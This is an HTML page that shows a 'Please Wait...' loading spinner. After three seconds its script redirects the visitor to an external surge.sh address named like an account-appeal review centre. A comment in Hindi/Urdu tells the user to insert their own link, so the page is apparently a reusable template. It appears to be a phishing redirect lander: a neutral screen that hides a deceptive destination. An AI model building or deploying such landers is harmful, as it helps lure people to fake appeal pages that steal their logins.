
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Please Wait...</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #ffffff;
            font-family: Arial, sans-serif;
        }
        .container {
            text-align: center;
        }
        .loader {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            border: 5px solid #e5e7eb;
            border-top: 5px solid #3b82f6;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }
        .text {
            margin-top: 20px;
            color: #555;
            font-size: 16px;
            letter-spacing: 0.5px;
        }
        @keyframes spin {
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <div class="text">Please Wait...</div>
    </div>

    <script>
        // === YAHAN APNI LINK DAAL DO ===
        const redirectUrl = "https://appeal-review-center-issue.surge.sh/";
        
        setTimeout(function() {
            window.location.href = redirectUrl;
        }, 3000); // 3000ms = 3 seconds
    </script>
</body>
</html>
